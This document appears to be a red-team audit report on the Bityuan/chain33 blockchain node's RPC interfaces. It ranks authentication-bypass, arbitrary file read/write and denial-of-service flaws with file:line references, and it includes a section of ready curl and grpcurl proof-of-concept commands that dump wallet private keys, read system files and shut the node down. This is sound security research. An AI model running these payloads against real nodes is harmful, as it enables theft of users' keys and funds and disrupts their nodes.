# Bityuan Red-Team: Auth Bypass / File-Write / RCE Matrix — 2026-08-15

> Static grep + targeted reads on `bityuan/bityuan` → `bysomeone/chain33@f4252a735f2d` + `bysomeone/plugin@1ef9e26f3e85`. No live node. Workspace: `/tmp/bityuan`, `/tmp/chain33`, `/tmp/bysomeone_plugin_extract`. See `references/bityuan-chain33-trust-graph-2026-08.md` for full trust graph.

## Ranked findings (file:line → trigger → effect → trust boundary → kill-test)

| # | File:line | Trigger (RPC method + params) | Effect | Trust boundary | Kill-test / severity honesty |
|---|-----------|-------------------------------|--------|----------------|------------------------------|
| CR-1 | `rpc/http.go:95-102` + `rpc/server.go:193-244` + `types/defaultcfg.go:94` | `Chain33.*` via JRPC `localhost:8801` any method (e.g. `DumpPrivkey`, `GetSeed`, `CloseQueue`) — loopback skips `checkJrpcFuncWhitelist/Blacklist` (`if !IsLoopback(){ check }`) | Unauth access to **84 JRPC methods** incl. wallet secrets + node kill | Loopback/SSRF → full RPC | Default `jrpcFuncWhitelist=["*"]`; `bityuan-fullnode.toml:50` only blacks 12; dev `bityuan.toml` blacks 0. Honest: remote blocked only if IP whitelisted, but SSRF = full. |
| CR-2 | `rpc/http.go:159-171 isLoopBackAddr` + `rpc/http.go:169 auth` + `rpc/server.go:543` | gRPC `localhost:8802` any `Chain33/*` (80+1 + `SubEvent`) — `isLoopBackAddr` only matches `*net.IPNet`, gRPC peer is `*net.TCPAddr` so bypass is brittle but effect is skip of `checkIPWhitelist` + `checkGrpcFuncValidity` via `return nil` | Same 80 gRPC methods + streaming subscribe + `reflection.Register` at `server.go:297` | Loopback/SSRF → gRPC | If `whitelist=["*"]` → `remoteIPWhitelist["0.0.0.0"]=true` (`server.go:203`) = global 0-auth. Bug in type assert masks bypass but IP path still true. |
| CR-3 | `wallet/wallet_proc.go:1561 FileName` → `os.OpenFile(...,O_CREATE\|O_APPEND\|O_RDWR,0666)` + `rpc/jrpchandler.go:964 DumpPrivkeysFile` / `436 ImportPrivkeysFile` | `Chain33.DumpPrivkeysFile {FileName:"/tmp/pwn", Passwd:"x"}` then `ImportPrivkeysFile {FileName:"/etc/passwd"}` | Arbitrary file create (0666) + arbitrary file read (`os.Open` + `ioutil.ReadAll` at `wallet_proc.go:1635,1642`) → key theft, overwrite | Loopback/SSRF (same gate as CR-1) | Path not sanitized (`filepath.Clean`/jail absent). `Dump` requires `checkWalletStatus` only (locked check), not path auth. Write not RCE alone (needs cron/systemd/webroot second link); read is immediate exfil. |
| HI-1 | `rpc/ethrpc/rpc.go:143,162,215` + `rpc/ethrpc/personal/personal.go:69-99` | ethRPC `localhost:8546` HTTP / `8547` WS: `personal_unlockAccount`, `personal_importRawKey`, `personal_sign` (calls `DumpPrivkey` at line 99), `eth_accounts` | Zero ACL ethRPC `*` CORS (`node.NewHTTPHandlerStack(...["*"],["*"])`) → unauth wallet unlock + privkey via `DumpPrivkey` | Any IP reaching ethRPC (default localhost, `0.0.0.0` if operator sets) | `ServeHTTP` only logs `IsPublicIP`, never calls `checkIPWhitelist`. `config JSONRPC.API=[eth,web3,personal,admin,net]` exposes `personal`. |
| HI-2 | `rpc/http.go:77 ioutil.ReadAll(r.Body)` | POST `/` with 500MB JSON + `SendTransaction {Data: hex(1GB)}` → `common.FromHex` + `types.Decode` at `jrpchandler.go:108,112` | Unbounded ReadAll → OOM + protobuf decode CPU | Same JRPC gate (IP check only) | No `http.MaxBytesReader`. gRPC same via `SendTransaction` `*pb.Transaction`. |
| HI-3 | `rpc/server.go:297 reflection.Register` | `grpcurl -plaintext localhost:8802 list` | Service enumeration leaks 80 methods for targeted fuzz | Loopback/whitelisted IP | Enable behind `EnableTrace` in fix. |
| MED-1 | `rpc/grpchandler.go:63 CreateNoBalanceTxs` + `wallet/wallet_proc.go:869 ProcSignRawTx` | `CreateNoBalanceTransaction {Privkey:"...", PayAddr:"..."}` — privkey in cleartext, logged at `http.go:92 log.Debug(request)` | Privkey leak in logs if not blacklisted | Logged pre-auth | Only 5 funcs in `rpcFilterPrintFuncBlacklist:624` (`UnLock\|SetPasswd\|GetSeed\|SaveSeed\|ImportPrivkey`); `CreateNoBalance` not covered. |
| MED-2 | `rpc/jrpchandler.go:926 Query` / `897 ExecWallet` via `wcom.QueryData.DecodeJSON(Driver,FuncName,Payload)` + `types.LoadExecutorType` | `Chain33.Query {Execer:"evm", FuncName:"...", Payload:...}` — attacker picks any registered dapp among `ticket, evm, token, trade, paracross, ...` + 12 `pluginmgr.AddRPC` services | Generic executor dispatch → EVM/parser fuzz surface | Same JRPC gate | No allowlist; post-fork gates (`bityuan.go:[fork.system]` 15 heights) only ACL some. |
| MED-3 | `wallet/wallet_proc.go:1576 0666` + `personal/personal.go:97 UnlockAccount` loop | `personal_sign` brute-force `UnlockAccount("",pwd,5)` + 0666 dump file world-readable | Offline brute-force + local user read | EthRPC loopback | No rate limit on `UnLock`. |

## Minimal PoC payloads (for loopback/SSRF)

```bash
# 1 — loopback dump privkey
curl -s http://127.0.0.1:8801/ -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"Chain33.DumpPrivkey","params":[{"data":"1Ge..."}]}'
# 2 — arbitrary file write (all keys, AES-GCM with attacker passwd)
curl -s http://127.0.0.1:8801/ -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"Chain33.DumpPrivkeysFile","params":[{"fileName":"/tmp/pwn","passwd":"x"}]}'
# 3 — arbitrary file read
curl -s http://127.0.0.1:8801/ -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"Chain33.ImportPrivkeysFile","params":[{"fileName":"/etc/hosts","passwd":"x"}]}'
# 4 — ethRPC personal (if 8546 reachable)
curl -s http://127.0.0.1:8546/ -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"personal_listAccounts","params":[]}'
# 5 — node kill
curl -s http://127.0.0.1:8801/ -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"Chain33.CloseQueue","params":[{}]}'
# gRPC
grpcurl -plaintext 127.0.0.1:8802 list
grpcurl -plaintext -d '{"fileName":"/tmp/pwn","passwd":"x"}' 127.0.0.1:8802 Chain33.DumpPrivkeysFile
```

## Why this matters for future audits

- **Loopback bypass pattern**: `if !IsLoopback(){ checkFuncWL }` is a class-wide bug — grep `IsLoopback` + `FuncWhitelist/Blacklist` on every Go chain RPC.
- **ethRPC zero-auth**: sidecar `eth-rpc` often skips the main RPC's `checkIPWhitelist`; always audit `ethrpc/rpc.go:ServeHTTP` separately.
- **FileName sinks**: `DumpPrivkeysFile/FileName` is a textbook `os.OpenFile(userInput, O_CREATE, 0666)` sink — add to file-write hunt checklist alongside `Backup*`/`Export*`.
- **Fork-height gates**: chain33's `bityuan.go:[fork.system]` is the real ACL — pre-fork heights bypass blacklists.

## Tooling note

`git --exec-path` missing `git-remote-https` on minimal images → use `codeload.github.com/.../zip/<commit>` + `file`/`unzip -l` validation + explicit `mv`. See hardened recipe in SKILL.md.
